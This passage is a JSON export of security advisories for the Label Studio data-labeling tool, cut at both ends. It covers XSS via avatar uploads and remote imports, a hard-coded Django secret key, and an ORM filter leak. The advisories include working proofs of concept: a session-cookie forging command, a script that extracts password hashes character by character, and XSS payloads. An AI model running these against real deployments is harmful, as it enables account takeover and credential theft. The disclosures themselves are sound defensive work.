'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a 